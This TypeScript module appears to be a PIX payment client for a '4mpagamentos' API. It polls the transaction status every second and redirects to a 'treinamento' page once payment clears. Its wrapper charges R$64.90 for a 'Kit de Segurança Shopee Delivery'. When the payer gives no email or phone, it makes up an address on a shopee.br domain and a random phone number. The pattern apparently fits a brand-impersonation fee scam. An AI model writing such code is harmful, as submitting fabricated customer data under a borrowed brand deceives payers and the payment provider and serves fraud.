/**
 * Cliente para pagamentos PIX via API 4mpagamentos
 */

// Interface para os dados da solicitação de pagamento
export interface PaymentRequest {
  name: string;
  cpf: string;
  email?: string;
  phone?: string;
  amount?: number;
}

// Interface para a resposta do pagamento (baseada na documentação 4mpagamentos)
export interface PaymentResponse {
  id: string;
  transactionId: string;
  pixCode: string;
  pixQrCode: string;
  amount: number;
  status: string;
  expiresAt: string;
  createdAt: string;
  error?: string;
}

// Configuração da API - usando endpoint local que gerencia a chave de forma segura
const API_ENDPOINT = '/api/4mpagamentos/payments';
const STATUS_ENDPOINT = '/api/4mpagamentos/transactions';

/**
 * Cria um pagamento PIX usando a API 4mpagamentos com verificação de status automática
 */
export async function createPixPaymentComplete(paymentData: {
  amount: number;
  customer_name: string;
  customer_email: string;
  customer_cpf: string;
  customer_phone: string;
  description: string;
}): Promise<PaymentResponse> {
  try {
    console.log('[4MPAGAMENTOS] Criando transação PIX...');
    
    // 1. CRIAÇÃO DA TRANSAÇÃO
    const response = await fetch(API_ENDPOINT, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(paymentData)
    });
    
    if (!response.ok) {
      throw new Error('Erro ao criar pagamento: ' + response.statusText);
    }
    
    const transaction = await response.json();
    console.log('[4MPAGAMENTOS] Transação criada:', transaction);
    
    // 2. VERIFICAÇÃO DE STATUS (A CADA 1 SEGUNDO)
    console.log('[4MPAGAMENTOS] Iniciando verificação de status...');
    
    const checkStatus = async (): Promise<void> => {
      try {
        const statusResponse = await fetch(`${STATUS_ENDPOINT}/${transaction.id}`);
        
        if (statusResponse.ok) {
          const statusData = await statusResponse.json();
          console.log('[4MPAGAMENTOS] Status:', statusData.status);
          
          if (statusData.status === 'paid' || statusData.status === 'approved' || statusData.status === 'PAID' || statusData.status === 'APPROVED' || statusData.status === 'COMPLETED') {
            console.log('[4MPAGAMENTOS] PAGAMENTO CONFIRMADO!');
            
            // Executa redirecionamento após 1 segundo
            setTimeout(() => {
              handleRedirect();
            }, 1000);
            
            return; // Para o loop
          } else if (statusData.status === 'expired' || statusData.status === 'cancelled') {
            console.log('[4MPAGAMENTOS] Transação expirada ou cancelada');
            return; // Para o loop
          }
        }
      } catch (error) {
        console.error('[4MPAGAMENTOS] Erro ao verificar status:', error);
      }
      
      // Continua verificando após 1 segundo
      setTimeout(() => checkStatus(), 1000);
    };
    
    // Inicia verificação
    checkStatus();
    
    // Retorna os dados da transação usando a estrutura correta da API 4mpagamentos
    return {
      id: transaction.id,
      transactionId: transaction.transactionId,
      pixCode: transaction.pixCode,
      pixQrCode: transaction.pixQrCode,
      amount: transaction.amount,
      status: transaction.status,
      expiresAt: transaction.expiresAt,
      createdAt: transaction.createdAt
    };
    
  } catch (error) {
    console.error('[4MPAGAMENTOS] Erro:', error);
    throw error;
  }
}

/**
 * Função de redirecionamento automático para /treinamento
 */
function handleRedirect(): void {
  const redirectUrl = 'treinamento';
  console.log('[4MPAGAMENTOS] Redirecionando para:', redirectUrl);
  
  // Redireciona para a página relativa
  window.location.href = window.location.origin + '/' + redirectUrl;
}

/**
 * Função wrapper para compatibilidade com a interface anterior
 */
export async function createPixPayment(data: PaymentRequest): Promise<PaymentResponse> {
  const amount = data.amount || 64.90; // Valor padrão
  
  const paymentData = {
    amount: amount,
    customer_name: data.name,
    customer_email: data.email || `${data.name.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`,
    customer_cpf: data.cpf.replace(/\D/g, ''), // Remove caracteres não numéricos
    customer_phone: data.phone || generateRandomPhone(),
    description: "Kit de Segurança Shopee Delivery"
  };
  
  return createPixPaymentComplete(paymentData);
}

/**
 * Gera um telefone aleatório quando não fornecido
 */
function generateRandomPhone(): string {
  const ddd = Math.floor(Math.random() * (99 - 11) + 11);
  const number = Math.floor(Math.random() * 1000000000).toString().padStart(9, '0');
  return `${ddd}${number}`;
}